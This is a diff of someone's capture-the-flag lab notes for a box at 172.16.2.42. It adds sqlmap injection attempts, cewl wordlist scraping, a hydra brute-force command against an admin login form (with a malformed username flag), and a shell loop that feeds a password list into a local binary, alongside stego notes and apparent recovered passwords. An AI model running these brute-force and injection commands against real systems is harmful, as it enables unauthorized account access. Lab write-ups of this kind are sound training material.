@@ -43,15 +43,23 @@ dirb https://172.16.2.42 /usr/share/wordlists/SecLists-master/Discovery/Web-Cont
 
 In addition, I picked at random one of the most common/popular user agents. This is to avoid the "script-kiddie" mistake of brute forcing a page and advertising it with a user agent that names your brute forcing tool.
 
-a /administrator page was picked up by the above wordlist. It redirected to an index.php which possessed a login form, which I manually tested for SQL injectability. Injection failed so I attempted to brute force it by testing out some predictable creds and passwords. I also used Cewl to scrape username/password ideas, and made lists with that. All of these failed.
+a /administrator/ page was picked up by the above wordlist. It redirected to an index.php which possessed a login form, which I manually tested for SQL injectability.
 
 ```bash
 sqlmap 172.16.2.42/administrator/index.php --forms
 ```
 
+Manual and automated injection failed so I attempted to brute force it by testing out some predictable creds and passwords. i started off with I also used Cewl to scrape username/password ideas, and made lists with that.
+
 ```bash
-cewl 172.16.2.42
+cewl 172.16.2.42 > cewl_output.txt
+
+# some manual parsing, extracting things which look like usernames into  cewl_usernames.txt and putting the entire dump into cewl_passwords.txt
+
+hydra -cewl_usernames.txt -P cewl_passwords.txt 172.16.2.42 http-post-form "/administrator/index.php:username=^USER^&pass=^PASS^:F=Failed" -e nsr -t27 -f -I
 ```
+
+No dice
 
 ```bash
 for val in (ls /usr/share/wordlists/SecLists-master/Passwords/Common-Credentials/10-million*.txt)
@@ -67,3 +75,7 @@ anused zsteg to decode challenge
 [2020-Oct-09 05:45:58 UTC] > had success with the zsteg tool after trying close to 10 tools that couldn't identify the stego in hidden.png. embarrassingly actually contacted author of the box, who also suggested zsteg. has been added to arsenal  
 [2020-Oct-09 06:01:52 UTC] > binary observed in www-data directory contained the strings Digite a senha: MrR0b0t121 n Senha errada n Senha Correta n Password@1238  
 [2020-Oct-09 06:02:16 UTC] > home directory also contained a dot file indicating the user has sudo rights
+
+```zsh
+for x in `cat /usr/share/wordlists/SecLists-master/Passwords/Common-Credentials/10-million-password-list-top-1000.txt`; do echo $x|./buffer|grep -vi "errada"|grep -vi "Digite a senha"|grep -vi "^\s*$"; done
+```
